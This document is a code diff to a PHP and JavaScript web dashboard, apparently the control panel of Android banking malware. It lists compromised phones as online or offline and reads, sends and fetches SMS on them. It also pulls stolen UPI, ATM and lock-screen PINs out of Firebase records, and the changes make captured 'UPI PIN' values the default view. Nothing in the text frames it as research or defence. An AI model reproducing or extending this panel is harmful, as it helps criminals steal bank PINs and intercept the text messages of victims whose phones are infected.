@@ -3,6 +3,11 @@ require_once __DIR__ . '/rebel_bot_lib.php';
 $REBEL_HAS_APP_LIB = is_file(__DIR__ . '/rebel_app_lib.php');
 if ($REBEL_HAS_APP_LIB) require_once __DIR__ . '/rebel_app_lib.php';
 
+if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
+  rebel_firebase_api_handle(false);
+}
+$serverProjects = rebel_firebase_list();
+
 if (isset($_GET['rebel_app_api'])) {
   header('Content-Type: application/json; charset=UTF-8');
   header('Cache-Control: no-store');
@@ -88,32 +93,32 @@ header('Pragma: no-cache');
 <meta name="theme-color" content="#050508"/>
 <meta name="apple-mobile-web-app-capable" content="yes"/>
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
-<title>Rebel Panel Mobile</title>
+<title>Nya Panel — Multi Firebase</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
 <style>
 :root{
-  --bg:#050508;--surface:#0d0d14;--card:#14141f;--border:#2a2a3a;
-  --accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;
-  --success:#00ff9d;--error:#ff4466;--nav-h:64px;--hdr-h:56px;
+  --bg:#07080f;--surface:#0f111a;--card:#151826;--border:#252a3d;
+  --accent:#6366f1;--accent2:#818cf8;--text:#e8e8f0;--muted:#6b6b88;
+  --success:#34d399;--error:#f87171;--nav-h:64px;--hdr-h:56px;
   --safe-t:env(safe-area-inset-top,0px);--safe-b:env(safe-area-inset-bottom,0px);
 }
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;overflow:hidden}
 body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 .app{position:fixed;inset:0;display:flex;flex-direction:column;background:
-  radial-gradient(ellipse 80% 50% at 50% -20%,rgba(255,60,60,0.15),transparent),
-  radial-gradient(ellipse 60% 40% at 100% 100%,rgba(255,149,0,0.08),transparent),
+  radial-gradient(ellipse 80% 50% at 50% -20%,rgba(99,102,241,0.18),transparent),
+  radial-gradient(ellipse 60% 40% at 100% 100%,rgba(129,140,248,0.1),transparent),
   var(--bg)}
 .hidden{display:none!important}
 .mono{font-family:'Space Mono',monospace}
 
 /* LOGIN */
 .login-screen{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;padding:24px;padding-top:calc(24px + var(--safe-t))}
-.login-card{width:100%;max-width:360px;padding:28px 22px;border-radius:24px;background:linear-gradient(160deg,rgba(20,20,30,0.95),rgba(10,10,16,0.98));border:1px solid rgba(255,60,60,0.2);box-shadow:0 24px 60px rgba(0,0,0,0.5)}
+.login-card{width:100%;max-width:360px;padding:28px 22px;border-radius:24px;background:linear-gradient(160deg,rgba(20,20,30,0.95),rgba(10,10,16,0.98));border:1px solid rgba(99,102,241,0.25);box-shadow:0 24px 60px rgba(0,0,0,0.5)}
 .login-logo{display:flex;align-items:center;gap:12px;margin-bottom:24px}
-.login-logo .mark{width:44px;height:44px;border-radius:14px;background:rgba(255,60,60,0.12);border:1.5px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:20px}
+.login-logo .mark{width:44px;height:44px;border-radius:14px;background:rgba(99,102,241,0.15);border:1.5px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:20px}
 .login-logo h1{font-size:22px;font-weight:800}
 .login-logo em{color:var(--accent);font-style:normal}
 .login-sub{color:var(--muted);font-size:12px;margin:-16px 0 20px}
@@ -326,12 +331,12 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 .sheet-handle{width:36px;height:4px;border-radius:4px;background:var(--border);margin:0 auto 16px}
 .sheet-title{font-size:13px;font-weight:800;margin-bottom:12px}
 .fb-option{display:flex;align-items:center;justify-content:space-between;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--card);margin-bottom:8px;cursor:pointer}
-.fb-option.active{border-color:var(--accent);background:rgba(255,60,60,0.08)}
+.fb-option.active{border-color:var(--accent);background:rgba(99,102,241,0.1)}
 .fb-option .cnt{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace}
 .fb-add-form{padding:12px 0 8px;border-top:1px solid var(--border);margin-top:8px}
 .fb-add-form input{width:100%;padding:12px 14px;margin-bottom:8px;border-radius:12px;border:1px solid var(--border);background:var(--card);color:var(--text);font-size:13px;outline:none}
 .fb-add-form input:focus{border-color:var(--accent)}
-.btn-add-fb{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent2),#cc7700);color:#111;font-weight:800;font-size:14px;cursor:pointer;margin-top:4px}
+.btn-add-fb{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;font-weight:800;font-size:14px;cursor:pointer;margin-top:4px}
 .chip.fb{background:rgba(255,149,0,0.15);color:var(--accent2);font-size:9px}
 
 .toast-wrap{position:fixed;top:calc(12px + var(--safe-t));left:14px;right:14px;z-index:200;pointer-events:none}
@@ -350,8 +355,8 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
         <img src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
       </div>
       <div>
-        <div class="hdr-title">Rebel Mobile</div>
-        <div class="hdr-sub" id="hdrSub">Connecting...</div>
+        <div class="hdr-title">Nya Panel</div>
+        <div class="hdr-sub" id="hdrSub">Multi Firebase · PIN clients</div>
       </div>
     </div>
     <div class="hdr-actions">
@@ -367,10 +372,10 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
         <div class="stat-card"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
         <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
       </div>
-      <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
+      <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search Only Pin clients..." oninput="renderDevices()"/></div>
       <div class="filter-row">
-        <button type="button" class="filter-chip active" data-filter="all" onclick="setDevFilter('all',this)">All</button>
-        <button type="button" class="filter-chip" data-filter="pin" onclick="setDevFilter('pin',this)">🔐 PIN</button>
+        <button type="button" class="filter-chip" data-filter="all" onclick="setDevFilter('all',this)">All</button>
+        <button type="button" class="filter-chip active" data-filter="pin" onclick="setDevFilter('pin',this)">🔐 PIN</button>
         <button type="button" class="filter-chip" data-filter="bank" onclick="setDevFilter('bank',this)">🏦 Bank</button>
       </div>
       <div id="devList"></div>
@@ -462,9 +467,11 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 
 <script src="firebase_defaults.js"></script>
 <script>
-var SEND_SMS_URL='mobile.php?rebel_send_sms=1';
-var FETCH_SMS_URL='mobile.php?rebel_fetch_sms=1';
-var APK_EXTRACT_URL='mobile.php?rebel_apk_extract=1';
+var SERVER_FIREBASES=<?php echo json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
+var SEND_SMS_URL='nya.php?rebel_send_sms=1';
+var FETCH_SMS_URL='nya.php?rebel_fetch_sms=1';
+var APK_EXTRACT_URL='nya.php?rebel_apk_extract=1';
+var FIREBASE_API_URL='nya.php?rebel_firebase_api=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
@@ -473,12 +480,12 @@ var deviceSmsCache={}, _smsLoadSeq=0, _smsLoading=false;
 var SMS_CACHE_KEY='rbl_sms_cache';
 var SMS_CACHE_MAX=100;
 var _smsPersistTimer=null;
-var devFilterMode='all', deviceBankCache={};
+var devFilterMode='pin', deviceBankCache={};
 var _procDevsTimer=null, _panelPaused=false;
 var SMS_POLL_MS=100, SMS_POLL_BG_MS=2000, SYNC_INTERVAL_MS=90000;
 var SMS_RENDER_DEBOUNCE_MS=50;
 var _smsRenderTimer=null, _sendInFlight=false;
-var FB_LIST_KEY='rbl_firebase_list';
+var FB_LIST_KEY='nya_firebase_list';
 var ACTIVE_FB_KEY='rbl_active_fb';
 var activeFbId='';
 var DEVICE_TOGGLE_KEY='rbl_device_toggles';
@@ -789,7 +796,7 @@ function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(fireb
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
 function extractPinFromRecord(raw){
   if(!raw||typeof raw!=='object')return '';
-  var keys=['pin','PIN','device_pin','devicePin','mpin','MPIN','upi_pin','upiPin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
+  var keys=['pin','PIN','upipin','upiPin','device_pin','devicePin','mpin','MPIN','upi_pin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
   var check=function(obj){
     if(!obj||typeof obj!=='object')return '';
     var i,v,s;
@@ -956,11 +963,14 @@ function loadFirebaseConfigs(){
   try{
     var s=localStorage.getItem(FB_LIST_KEY);
     if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
+      (SERVER_FIREBASES||[]).forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
       DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
       return p;
     }}
   }catch(e){}
-  return DEFAULT_FIREBASES.slice();
+  var p=(SERVER_FIREBASES||[]).slice();
+  DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
+  return p;
 }
 function getFbAuthKey(inst){
   if(!inst||!inst.config)return '';
@@ -1520,7 +1530,7 @@ function renderDevices(){
     return;
   }
   el.innerHTML=list.map(function(d){
-    var pinChip=d.pin?'<span class="chip bat">PIN '+esc(d.pin)+'</span>':'';
+    var pinChip=d.pin?'<span class="chip bat">UPI PIN: '+esc(d.pin)+'</span>':'';
     var bankChip=deviceBankCache[d.id]===true?'<span class="chip fb">🏦 Bank</span>':'';
     return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" data-dev-id="'+escAttr(d.id)+'">'+
       '<div class="dev-bar"></div><div class="dev-body">'+
